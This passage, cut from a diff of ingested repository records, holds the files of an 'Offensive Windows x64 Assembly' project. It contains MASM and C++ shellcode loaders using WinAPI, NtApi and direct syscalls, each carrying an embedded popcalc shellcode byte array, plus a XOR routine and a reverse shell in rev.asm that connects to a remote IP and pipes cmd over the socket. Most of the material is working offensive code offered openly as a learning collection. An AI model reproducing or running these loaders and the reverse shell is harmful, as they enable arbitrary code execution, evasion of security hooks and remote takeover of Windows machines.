xc6\\x48\\x31\\xc9\\x48\\xf7\\xe1\\x50\\x48\\xb8\\x9c\\x9e\\x93\\x9c\\xd1\\x9a\\x87\\x9a\\x48\\xf7\\xd0\\x50\\x48\\x89\\xe1\\x48\\xff\\xc2\"\n\"\\x48\\x83\\xec\\x20\\x41\\xff\\xd6\";\n\nint main() {\n NtApi(NtCurrentProcess(), payload);\n return 0;\n}\n\n---\n\n*Automatic ingestion status: degraded*",
+    "source:f6915c769e71eee7b97604": "## ntapi.asm\n\nThe provided content is an assembly code snippet designed to interact with native API functions such as NtAllocateVirtualMemory, NtWriteVirtualMemory, and NtProtectVirtualMemory. It sets up stack space and calls these functions with specific parameters to manage memory allocation, writing, and protection operations within a process context.\n\n---\n\nextern NtAllocateVirtualMemory: proc\nextern NtWriteVirtualMemory: proc\nextern NtProtectVirtualMemory: proc\n\n.data\nmyMemory dq ?\noldProtect dq 0\ndwSize dq 1024\nBytesWritten dq ?\n.code\nNtApi proc\n; Setup Stack (Shadow space 32 bytes + 16 bytes padding = 48/30h)\n sub rsp, 30h \n mov rbx, rdx\n\n;__kernel_entry NTSYSCALLAPI NTSTATUS NtAllocateVirtualMemory(\n; [in] HANDLE ProcessHandle,\n; [in, out] PVOID *BaseAddress,\n; [in] ULONG_PTR ZeroBits,\n; [in, out] PSIZE_T RegionSize,\n; [in] ULONG AllocationType,\n; [in] ULONG Protect)\n mov r12, rcx\n lea rdx, [myMemory]\n xor r8, r8\n lea r9, [dwSize] \n mov qword ptr [rsp+20h], 3000h \n mov qword ptr [rsp+28h], 4h \n call NtAllocateVirtualMemory\n \n;NtWriteVirtualMemory(\n;IN HANDLE ProcessHandle,\n;IN PVOID BaseAddress,\n;IN PVOID Buffer,\n;IN SIZE_T NumberOfBytesToWrite,\n;OUT PSIZE_T NumberOfBytesWritten OPTIONAL);\n\n sub rsp, 30h\n mov rcx, r12\n mov rdx, myMemory \n mov r8, rbx \n mov r9, dwSize\n lea r11, [BytesWritten]\n mov qword ptr [rsp-20], r11\n call NtWriteVirtualMemory\n \n add rsp, 30h\n\n; NtProtectVirtualMemory(\n; IN HANDLE ProcessHandle,\n; IN OUT PVOID* BaseAddress,\n; IN OUT PSIZE_T RegionSize,\n; IN ULONG NewProtect,\n; OUT PULONG OldProtect);\n\n mov rcx, r12\n lea rdx, [myMemory]\n lea r8, [dwSize] \n mov r9, 20h \n lea r11, [oldProtect] \n mov qword ptr [rsp+20h], r11\n call NtProtectVirtualMemory\n\n; We ensure RSP is 16-byte aligned before jumping to the payload\n and rsp, -16 \n \n; Execute the Memory Block\n call myMemory \n\n add rsp, 30h\n ret\nNtApi endp\nend\n\n## Explicit entities\n\n- NtAllocateVirtualMemory (other)\n- NtWriteVirtualMemory (other)\n- NtProtectVirtualMemory (other)\n\n---\n\n*Automatic ingestion status: degraded*",
+    "source:4951842f8a341cc4156168": "## main.cpp\n\nThis C++ program includes necessary headers for Winsock2 and Windows, and defines an external function RevConnect. The main function directly calls RevConnect with specific network parameters, suggesting a socket connection attempt.\n\n---\n\n#pragma comment(lib, \"Ws2_32.lib\")\n#include <winsock2.h>\n#include <windows.h>\n\nextern \"C\" SOCKET RevConnect(const char* IP, unsigned short port);\n\nint main() {\n\tRevConnect(\"192.168.186.130\", 445);\n\n\treturn 0;\n\n\n}\n\n## Explicit entities\n\n- RevConnect (other)\n- 192.168.186.130 (other)\n\n---\n\n*Automatic ingestion status: degraded*",
+    "source:c168bd90f593bdb86a0d5a": "## rev.asm\n\nThe provided assembly code outlines a sequence of operations for network programming, including WSAStartup, WSASocketA, and connect calls to establish a connection. It subsequently sets handle information and calls CreateProcessA to launch a new process. The code manages various structures like WSADATA64, SOCKADDR_IN, STARTUPINFOA, and PROCESS_INFORMATION64, handling error checking throughout the process flow.\n\n---\n\nEXTERN WSAStartup:PROC\nEXTERN WSACleanup:PROC\nEXTERN WSASocketA:PROC\nEXTERN connect:PROC\nEXTERN closesocket:PROC\nEXTERN htons:PROC\nEXTERN inet_addr:PROC\nEXTERN CreateProcessA:PROC\nEXTERN SetHandleInformation:PROC\n\nAF_INET EQU 2\nSOCK_STREAM EQU 1\nIPPROTO_TCP EQU 6\n\nINVALID_SOCKET EQU -1\nSOCKET_ERROR EQU -1\n\nSTARTF_USESTDHANDLES EQU 00000100h\nCREATE_NO_WINDOW EQU 08000000h\nHANDLE_FLAG_INHERIT EQU 00000001h\nINFINITE EQU 0FFFFFFFFh\n\nWSADATA64 STRUCT\n wVersion WORD ?\n wHighVersion WORD ?\n szDescription BYTE 257 DUP(?)\n szSystemStatus BYTE 129 DUP(?)\n iMaxSockets WORD ?\n iMaxUdpDg WORD ?\n lpVendorInfo QWORD ?\nWSADATA64 ENDS\n\nSOCKADDR_IN STRUCT\n sin_family WORD ?\n sin_port WORD ?\n sin_addr DWORD ?\n sin_zero BYTE 8 DUP(?)\nSOCKADDR_IN ENDS\n\nSTARTUPINFOA STRUCT\n cb DWORD ?\n _pad0 DWORD ?\n lpReserved QWORD ?\n lpDesktop QWORD ?\n lpTitle QWORD ?\n\n dwX DWORD ?\n dwY DWORD ?\n dwXSize DWORD ?\n dwYSize DWORD ?\n dwXCountChars DWORD ?\n dwYCountChars DWORD ?\n dwFillAttribute DWORD ?\n dwFlags DWORD ?\n\n wShowWindow WORD ?\n cbReserved2 WORD ?\n _pad1 DWORD ?\n\n lpReserved2 QWORD ?\n hStdInput QWORD ?\n hStdOutput QWORD ?\n hStdError QWORD ?\nSTARTUPINFOA ENDS\n\nPROCESS_INFORMATION64 STRUCT\n hProcess QWORD ?\n hThread QWORD ?\n dwProcessId DWORD ?\n dwThreadId DWORD ?\n dwPadding_ DWORD ?\nPROCESS_INFORMATION64 ENDS\n\n.data?\nwsaData WSADATA64 <>\nsockaddr_buf SOCKADDR_IN <>\nsinfo STARTUPINFOA <>\npinfo PROCESS_INFORMATION64 <>\nappPath db 16 DUP(?)\n\n.code\n\nRevConnect PROC\n\n push rdi\n push rsi\n push rbx\n sub rsp, 0A0h; Allocate a secure stack frame (16-byte aligned)\n\n mov rdi, rcx \n mov ebx, edx \n\n; WSAStartup(0x0202, &wsaData)\n lea rdx, wsaData\n mov ecx, 0202h\n call WSAStartup\n test eax, eax\n jnz fail\n\n; WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0)\n mov ecx, AF_INET\n mov edx, SOCK_STREAM\n mov r8d, IPPROTO_TCP\n xor r9, r9; lpProtocolInfo = NULL\n mov qword ptr [rsp + 20h], 0; g = 0 (5th arg)\n mov qword ptr [rsp + 28h], 0; dwFlags = 0 (6th arg)\n call WSASocketA\n cmp rax, INVALID_SOCKET\n je fail_cleanup\n\n mov rsi, rax; rsi = socket handle\n\n; Explicitly mark socket handle as inheritable\n mov rcx, rsi \n mov edx, HANDLE_FLAG_INHERIT \n mov r8d, HANDLE_FLAG_INHERIT \n call SetHandleInformation\n\n; sockaddr_in setup\n mov word ptr [sockaddr_buf.sin_family], AF_INET\n mov ecx, ebx\n call htons\n mov word ptr [sockaddr_buf.sin_port], ax\n\n mov rcx, rdi\n call inet_addr\n mov dword ptr [sockaddr_buf.sin_addr], eax\n\n; connect(socket, &sa, sizeof(sa))\n mov rcx, rsi\n lea rdx, sockaddr_buf\n mov r8d, SIZEOF SOCKADDR_IN\n call connect\n \n cmp eax, SOCKET_ERROR\n je fail_socket\n\n mov dword ptr [sinfo.cb], SIZEOF STARTUPINFOA\n mov dword ptr [sinfo.dwFlags], STARTF_USESTDHANDLES\n \n; Map the socket handle cleanly to all standard handles\n mov qword ptr [sinfo.hStdInput], rsi\n mov qword ptr [sinfo.hStdOutput], rsi\n mov qword ptr [sinfo.hStdError], rsi\n\n lea rax, appPath\n mov byte ptr [rax+0], 'c'\n mov byte ptr [rax+1], 'm'\n mov byte ptr [rax+2], 'd'\n mov byte ptr [rax+3], 0\n\n;CreateProcessA(NULL, \"cmd\", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo)\n xor r12, r12\n mov qword ptr [rsp + 20h], 1; bInheritHandles = TRUE (5th param)\n mov qword ptr [rsp + 28h], CREATE_NO_WINDOW; dwCreationFlags (6th param)\n mov qword ptr [rsp + 30h], r12; lpEnvironment (7th param)\n mov qword ptr [rsp + 38h], r12; lpCurrentDirectory (8th param)\n \n lea r12, sinfo\n mov qword ptr [rsp + 40h], r12; lpStartupInfo (9th param)\n \n lea r12, pinfo\n mov qword ptr [rsp + 48h], r12; lpProcessInformation (10th param)\n\n xor rcx, rcx; lpApplicationName = NULL\n lea rdx, appPath; lpCommandLine = \"cmd\"\n xor r8, r8; lpProcessAttributes = NULL\n xor r9, r9; lpThreadAttributes = NULL\n\n call CreateProcessA\n \nfail_socket:\n mov rcx, rsi\n call closesocket\n\nfail_cleanup:\n call WSACleanup\n\nfail:\n xor rax, rax\n\nexit_func:\n add rsp, 0A0h\n pop rbx\n pop rsi\n pop rdi\n ret\n\nRevConnect ENDP\n\nEND\n\n## Explicit entities\n\n- WSAStartup (other)\n- WSASocketA (other)\n- connect (other)\n- CreateProcessA (other)\n\n---\n\n*Automatic ingestion status: degraded*",
+    "source:578f0653567fea44abd73d": "## alloc.asm\n\nThis assembly code outlines procedures for allocating memory using VirtualAlloc, moving data using RtlMoveMemory, and modifying memory protection using VirtualProtect. It includes setup for stack alignment and execution of a memory block.\n\n---\n\nextern VirtualAlloc: proc\nextern RtlMoveMemory: proc\nextern VirtualProtect: proc\n\n.data\nmyMemory dq ?\noldProtect dd 0\n\n.code\nAllocate proc\n; Setup Stack (Shadow space 32 bytes + 16 bytes padding = 48/30h)\n sub rsp, 30h \n mov rbx, rcx \n\n; VirtualAlloc(0, 1024, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)\n xor rcx, rcx \n mov rdx, 1024 \n mov r8, 3000h \n mov r9, 4h \n call VirtualAlloc\n \n test rax, rax \n jz exit_proc\n mov myMemory, rax \n\n;RtlMoveMemory(myMemory, payload_ptr, 205)\n mov rcx, rax \n mov rdx, rbx \n mov r8, 205 \n call RtlMoveMemory\n\n;VirtualProtect(myMemory, 205, PAGE_EXECUTE_READ, &oldProtect)\n mov rcx, myMemory \n mov rdx, 205 \n mov r8, 20h \n lea r9, [oldProtect] \n call VirtualProtect\n\n test rax, rax \n jz exit_proc\n; We ensure RSP is 16-byte aligned before jumping to the payload\n and rsp, -16 \n \n; Execute the Memory Block\n call myMemory \n\nexit_proc:\n add rsp, 30h\n ret\nAllocate endp\nend\n\n## Explicit entities\n\n- VirtualAlloc (other)\n- RtlMoveMemory (other)\n- VirtualProtect (other)\n\n---\n\n*Automatic ingestion status: degraded*",
+    "source:da84ab5dc563d46e3edfb7": "## main.cpp\n\nThis file contains a C function Allocate that accepts a payload and executes it. The payload is a sequence of x86 assembly instructions, referencing a popcalc exploit.\n\nThis code demonstrates the allocation and execution of a shellcode payload via a C interface.\n\n---\n\nextern \"C\" void Allocate(unsigned char* payload);\n\n\n// popcalc https://www.exploit-db.com/shellcodes/49819\nunsigned char payload[] = \"\\x48\\x31\\xff\\x48\\xf7\\xe7\\x65\\x48\\x8b\\x58\\x60\\x48\\x8b\\x5b\\x18\\x48\\x8b\\x5b\\x20\\x48\\x8b\\x1b\\x48\\x8b\\x1b\\x48\\x8b\\x5b\\x20\\x49\\x89\\xd8\\x8b\"\n \"\\x5b\\x3c\\x4c\\x01\\xc3\\x48\\x31\\xc9\\x66\\x81\\xc1\\xff\\x88\\x48\\xc1\\xe9\\x08\\x8b\\x14\\x0b\\x4c\\x01\\xc2\\x4d\\x31\\xd2\\x44\\x8b\\x52\\x1c\\x4d\\x01\\xc2\"\n \"\\x4d\\x31\\xdb\\x44\\x8b\\x5a\\x20\\x4d\\x01\\xc3\\x4d\\x31\\xe4\\x44\\x8b\\x62\\x24\\x4d\\x01\\xc4\\xeb\\x32\\x5b\\x59\\x48\\x31\\xc0\\x48\\x89\\xe2\\x51\\x48\\x8b\"\n \"\\x0c\\x24\\x48\\x31\\xff\\x41\\x8b\\x3c\\x83\\x4c\\x01\\xc7\\x48\\x89\\xd6\\xf3\\xa6\\x74\\x05\\x48\\xff\\xc0\\xeb\\xe6\\x59\\x66\\x41\\x8b\\x04\\x44\\x41\\x8b\\x04\"\n \"\\x82\\x4c\\x01\\xc0\\x53\\xc3\\x48\\x31\\xc9\\x80\\xc1\\x07\\x48\\xb8\\x0f\\xa8\\x96\\x91\\xba\\x87\\x9a\\x9c\\x48\\xf7\\xd0\\x48\\xc1\\xe8\\x08\\x50\\x51\\xe8\\xb0\"\n \"\\xff\\xff\\xff\\x49\\x89\\xc6\\x48\\x31\\xc9\\x48\\xf7\\xe1\\x50\\x48\\xb8\\x9c\\x9e\\x93\\x9c\\xd1\\x9a\\x87\\x9a\\x48\\xf7\\xd0\\x50\\x48\\x89\\xe1\\x48\\xff\\xc2\"\n \"\\x48\\x83\\xec\\x20\\x41\\xff\\xd6\";\n\nint main() {\n\tAllocate(payload);\n\treturn 0;\n}\n\n## Explicit entities\n\n- Allocate (other)\n- popcalc (other)\n\n---\n\n*Automatic ingestion status: degraded*",
+    "source:2b4e9844e8b33987159cfe": "## main.cpp\n\nThis C++ file includes declarations for native Windows API functions such as NtAllocateVirtualMemory, NtProtectVirtualMemory, and NtWriteVirtualMemory. It provides helper functions to retrieve the addresses of these functions from the NTDLL module and includes a payload intended for use with popcalc, suggesting an exploit or memory manipulation technique. The main function orchestrates the loading of the NTDLL handle and subsequently calls the native syscall functions with a prepared payload.\n\n---\n\n#pragma once\n#include <Windows.h>\n\n#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)\n\n\nEXTERN_C NTSTATUS NtAllocateVirtualMemory(\n HANDLE ProcessHandle,\n PVOID* BaseAddress,\n ULONG_PTR ZeroBits,\n PSIZE_T RegionSize,\n ULONG AllocationType,\n ULONG Protect\n);\n\nEXTERN_C NTSTATUS NtProtectVirtualMemory(\n IN HANDLE ProcessHandle,\n IN OUT PVOID* BaseAddress,\n IN OUT PSIZE_T RegionSize,\n IN ULONG NewProtect,\n OUT PULONG OldProtect);\n\nEXTERN_C NTSTATUS NtWriteVirtualMemory(\n IN HANDLE ProcessHandle,\n IN PVOID BaseAddress,\n IN PVOID Buffer,\n IN SIZE_T NumberOfBytesToWrite,\n OUT PSIZE_T NumberOfBytesWritten OPTIONAL\n);\nHMODULE NtdllHandle = NULL;\n\n// from [private-source]\n\nVOID GetSyscallNumber(\n _In_ HMODULE NtdllHandle,\n _In_ LPCSTR NtFunctionName,\n _Out_ PDWORD NtFunctionSSN\n) {\n\n UINT_PTR NtFunctionAddress = 0;\n\n NtFunctionAddress = (UINT_PTR)GetProcAddress(NtdllHandle, NtFunctionName);\n\n *NtFunctionSSN = ((PBYTE)(NtFunctionAddress + 0x4))[0];\n return;\n\n}\n\nextern \"C\" {\n DWORD g_NtAllocateVirtualMemorySSN = 0;\n DWORD g_NtWriteVirtualMemorySSN = 0;\n DWORD g_NtProtectVirtualMemorySSN = 0;\n}\nextern \"C\" void NtSyscalls(HANDLE handle, unsigned char* payload);\n\n\n// popcalc https://www.exploit-db.com/shellcodes/49819\nunsigned char payload[] = \"\\x48\\x31\\xff\\x48\\xf7\\xe7\\x65\\x48\\x8b\\x58\\x60\\x48\\x8b\\x5b\\x18\\x48\\x8b\\x5b\\x20\\x48\\x8b\\x1b\\x48\\x8b\\x1b\\x48\\x8b\\x5b\\x20\\x49\\x89\\xd8\\x8b\"\n\"\\x5b\\x3c\\x4c\\x01\\xc3\\x48\\x31\\xc9\\x66\\x81\\xc1\\xff\\x88\\x48\\xc1\\xe9\\x08\\x8b\\x14\\x0b\\x4c\\x01\\xc2\\x4d\\x31\\xd2\\x44\\x8b\\x52\\x1c\\x4d\\x01\\xc2\"\n\"\\x4d\\x31\\xdb\\x44\\x8b\\x5a\\x20\\x4d\\x01\\xc3\\x4d\\x31\\xe4\\x44\\x8b\\x62\\x24\\x4d\\x01\\xc4\\xeb\\x32\\x5b\\x59\\x48\\x31\\xc0\\x48\\x89\\xe2\\x51\\x48\\x8b\"\n\"\\x0c\\x24\\x48\\x31\\xff\\x41\\x8b\\x3c\\x83\\x4c\\x01\\xc7\\x48\\x89\\xd6\\xf3\\xa6\\x74\\x05\\x48\\xff\\xc0\\xeb\\xe6\\x59\\x66\\x41\\x8b\\x04\\x44\\x41\\x8b\\x04\"\n\"\\x82\\x4c\\x01\\xc0\\x53\\xc3\\x48\\x31\\xc9\\x80\\xc1\\x07\\x48\\xb8\\x0f\\xa8\\x96\\x91\\xba\\x87\\x9a\\x9c\\x48\\xf7\\xd0\\x48\\xc1\\xe8\\x08\\x50\\x51\\xe8\\xb0\"\n\"\\xff\\xff\\xff\\x49\\x89\\xc6\\x48\\x31\\xc9\\x48\\xf7\\xe1\\x50\\x48\\xb8\\x9c\\x9e\\x93\\x9c\\xd1\\x9a\\x87\\x9a\\x48\\xf7\\xd0\\x50\\x48\\x89\\xe1\\x48\\xff\\xc2\"\n\"\\x48\\x83\\xec\\x20\\x41\\xff\\xd6\";\n\nint main() {\n \n\n NtdllHandle = GetModuleHandleW(L\"NTDLL\");\n\n GetSyscallNumber(NtdllHandle, \"NtAllocateVirtualMemory\", &g_NtAllocateVirtualMemorySSN);\n GetSyscallNumber(NtdllHandle, \"NtWriteVirtualMemory\", &g_NtWriteVirtualMemorySSN);\n GetSyscallNumber(NtdllHandle, \"NtProtectVirtualMemory\", &g_NtProtectVirtualMemorySSN);\n \n NtSyscalls(NtCurrentProcess(), payload);\n return 0;\n}\n\n## Explicit entities\n\n- NtAllocateVirtualMemory (other)\n- NtWriteVirtualMemory (other)\n- NtProtectVirtualMemory (other)\n- NtSyscalls (other)\n- NtCurrentProcess() (other)\n\n---\n\n*Automatic ingestion status: degraded*",
+    "source:fc45cf0d02ec691729957a": "## syscalls.asm\n\nThis assembly code defines procedures for calling native functions like NtAllocateVirtualMemory, NtWriteVirtualMemory, and NtProtectVirtualMemory. It sets up shadow space on the stack to pass arguments to these system calls, including memory addresses and sizes, and includes logic for cleanup and execution flow.\n\n---\n\nEXTRN g_NtAllocateVirtualMemorySSN:DWORD\nEXTRN g_NtWriteVirtualMemorySSN:DWORD\nEXTRN g_NtProtectVirtualMemorySSN:DWORD\n\n.data\nmyMemory dq ?\noldProtect dq 0\ndwSize dq 1024\nBytesWritten dq ?\n\n.code\n\nNtAllocateVirtualMemory proc \n mov r10, rcx\n mov eax, g_NtAllocateVirtualMemorySSN \n syscall \n ret \nNtAllocateVirtualMemory endp\n\nNtWriteVirtualMemory proc \n mov r10, rcx\n mov eax, g_NtWriteVirtualMemorySSN \n syscall \n ret \nNtWriteVirtualMemory endp \n\nNtProtectVirtualMemory proc\n mov r10, rcx\n mov eax, g_NtProtectVirtualMemorySSN \n syscall\n ret \nNtProtectVirtualMemory endp\n\n\nNtSyscalls proc\n; 1. Save non-volatile registers used in this function (Windows x64 requirement)\n push rbx\n push r12\n push rsi; keeping 16-byte alignment (3 pushes = 24 bytes, plus 8 for return address = 32 bytes)\n\n; Setup standard 32-byte shadow space for our calls\n sub rsp, 20h \n\n mov rbx, rdx \n mov r12, rcx \n\n mov rcx, r12\n lea rdx, [myMemory]\n xor r8, r8\n lea r9, [dwSize] \n mov qword ptr [rsp + 20h], 3000h \n mov qword ptr [rsp + 28h], 04h \n call NtAllocateVirtualMemory\n \n \n mov rcx, r12\n mov rdx, myMemory \n mov r8, rbx \n mov r9, dwSize\n lea r11, [BytesWritten]\n mov qword ptr [rsp + 20h], r11 \n call NtWriteVirtualMemory\n \n mov rcx, r12\n lea rdx, [myMemory]\n lea r8, [dwSize] \n mov r9, 20h \n lea r11, [oldProtect] \n mov qword ptr [rsp + 20h], r11 \n call NtProtectVirtualMemory\n\n; Clean up shadow space stack allocation\n add rsp, 20h\n\n; Restore non-volatile registers\n pop rsi\n pop r12\n pop rbx\n\n; Ensure 16-byte alignment before jumping to shellcode payload\n and rsp, -16 \n \n; Execute the allocated & unlocked Memory Block\n call qword ptr [myMemory] \n\n ret\nNtSyscalls endp\n\nend\n\n## Explicit entities\n\n- g_NtAllocateVirtualMemorySSN (other)\n- NtAllocateVirtualMemory (other)\n- g_NtWriteVirtualMemorySSN (other)\n- NtWriteVirtualMemory (other)\n- NtProtectVirtualMemory (other)\n- NtSyscalls (other)\n\n---\n\n*Automatic ingestion status: degraded*",
+    "source:85c72a8be5174c476cb803": "## main.cpp\n\nThis C++ program includes an external function `XorIt` to perform XOR operations on byte arrays. The main function initializes a byte array with \"Hello\" and uses the key \"test\" for both encryption and decryption cycles, printing the results.\n\n---\n\n#include <iostream>\n\nusing namespace std;\nextern \"C\" void XorIt(unsigned char* data, const char* key, size_t dataSize, size_t keySize);\n\nint main() {\n\tunsigned char data[] = \"Hello\";\n\tconst char* key = \"test\";\n\n\tXorIt(data, key, sizeof(data) - 1, strlen(key));\n\tcout<<\"Encrypted: \" << data << endl;\n\tXorIt(data, key, sizeof(data) - 1, strlen(key));\n\tcout << \"Decrypted: \" << data << endl;\n\n}\n\n## Explicit entities\n\n- XorIt (other)\n\n---\n\n*Automatic ingestion status: degraded*",
+    "source:39cbdb4b4a246e712ac6fe": "## xorit.asm\n\nThis is an assembly language snippet written in xorit.asm. The code defines a procedure that initializes registers, enters a loop labeled 'loopxor', where it performs an XOR operation between a value in r10 and a value in r11, and increments/decrements counters until a condition is met. It includes logic to handle memory manipulation and loop control.\n\n---\n\n.data\n\n.code\n\nXorIt proc\n\tmov r10, rcx\n\tmov r11, rdx\n\tpush r12\n\tlea r12, [rdx+r9]\n\t\nloopxor:\n cmp r8, 0\n je done\n \n mov al, [r10]\n xor al, [r11]\n mov [r10], al\n \n inc r10\n inc r11\n dec r8\n \n cmp r11, r12\n jne loopxor\n \n mov r11, rdx\n \n jmp loopxor\ndone:\n pop r12\n\tret\nXorIt endp\nend\n\n## Explicit entities\n\n- xorit.asm (other)\n\n---\n\n*Automatic ingestion status: degraded*",
+    "source:86add4df83091a2fab4222": "## README.md\n\nThe record describes a collection of Visual Studio projects built with masm where assembly functions are called from C with necessary arguments. The included programs feature a Win API shellcode loader, NtApi shellcode loader, Syscalls shellcode loader, an Indirect Syscalls Shellcode loader, a basic Xor encryption program, and a Reverse Shell using WinSock and CreateProcessA. Credits are provided for a tutorial on dynamic memory assembly and source code for loaders in C.\n\n---\n\n# Offensive Windows x64 Assembly\n\nCollection of programs I made while learning assembly. They are Visual studio projects that use masm as build dependency and the assembly functions are called in C and then are given the necessary arguments.\n\n* Win API shellcode loader\n* NtApi Shellcode loader\n* Syscalls Shellcode loader (with some code in C to resolve functions)\n* Indirect Syscalls Shellcode loader\n* Basic Xor encryption program\n* Reverse Shell using WinSock and CreateProcessA\n\n# Credits\n[Creel Dynamic Memory Assembly Tutorial](https://www.youtube.com/watch?v=vJPwAjJN2Yg&list=LL)\n\n[Cr-0w Source B Loaders in C]([private-source])\n\n## Explicit entities\n\n- Win API shellcode loader (other)\n- NtApi Shellcode loader (other)\n- Syscalls Shellcode loader (other)\n- Indirect Syscalls Shellcode loader (other)\n- Basic Xor encryption program (other)\n- Reverse Shell using WinSock and CreateProcessA (other)\n- Creel Dynamic Memory Assembly Tutorial (other)\n- Cr-0w Source B Loaders in C (other)\n\n---\n\n*Automatic ingestion status: degraded*"
   }
 }
